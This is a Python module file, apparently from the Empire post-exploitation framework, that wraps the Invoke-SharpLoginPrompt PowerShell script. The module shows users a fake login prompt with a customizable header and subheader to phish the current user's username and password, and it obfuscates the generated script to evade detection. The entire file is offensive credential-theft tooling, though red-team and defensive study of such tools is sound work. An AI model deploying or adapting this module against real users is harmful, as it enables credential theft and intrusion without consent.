from __future__ import print_function
from builtins import str
from builtins import object
from lib.common import helpers


class Module(object):

    def __init__(self, mainMenu, params=[]):

        # Metadata info about the module, not modified during runtime
        self.info = {
            # Name for the module that will appear in module menus
            'Name': 'Invoke-SharpLoginPrompt',

            # List of one or more authors for the module
            'Author': ['@shantanu561993', '@S3cur3Th1sSh1t'],

            # More verbose multi-line description of the module
            'Description': ("This Program creates a login prompt to gather username and password of the current user. "
                            "This project allows red team to phish username and password of the current user without "
                            "touching lsass and having administrator credentials on the system."),

            'Software': '',

            'Techniques': ['T1056'],

            # True if the module needs to run in the background
            'Background': False,

            # File extension to save the file as
            'OutputExtension': None,

            # True if the module needs admin rights to run
            'NeedsAdmin': False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe': True,

            # The language for this module
            'Language': 'powershell',

            # The minimum PowerShell version needed for the module to run
            'MinLanguageVersion': '4',

            # List of any references/other comments
            'Comments': [
                'https://github.com/shantanu561993/SharpLoginPrompt'
            ]
        }

        # Any options needed by the module, settable during runtime
        self.options = {
            # Format:
            #   value_name : {description, required, default_value}
            'Agent': {
                # The 'Agent' option is the only one that MUST be in a module
                'Description': 'Agent to run on.',
                'Required': True,
                'Value': ''
            },
            'Header': {
                'Description': 'Customized heading for login prompt.',
                'Required': False,
                'Value': '',
            },
            'Subheader': {
                'Description': 'Customized subheading for prompt.',
                'Required': False,
                'Value': '',
            }
        }

        self.mainMenu = mainMenu

        if params:
            for param in params:
                # Parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):
        # First method: Read in the source script from module_source
        module_source = self.mainMenu.installPath + "/data/module_source/collection/Invoke-SharpLoginPrompt.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscationCommand)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
            return ""

        module_code = f.read()
        f.close()

        script = module_code
        script_end = 'Invoke-SharpLoginPrompt -Command "'

        # Add any arguments to the end execution of the script
        if self.options['Header']['Value']:
            script_end += " '" + self.options['Header']['Value'] + "'"
        if self.options['Subheader']['Value']:
            script_end += " '" + self.options['Subheader']['Value'] + "'"
        script_end += '"'

        if obfuscate:
            script_end = helpers.obfuscate(psScript=script_end, installPath=self.mainMenu.installPath,
                                          obfuscationCommand=obfuscationCommand)
        script += script_end
        script = helpers.keyword_obfuscation(script)

        return script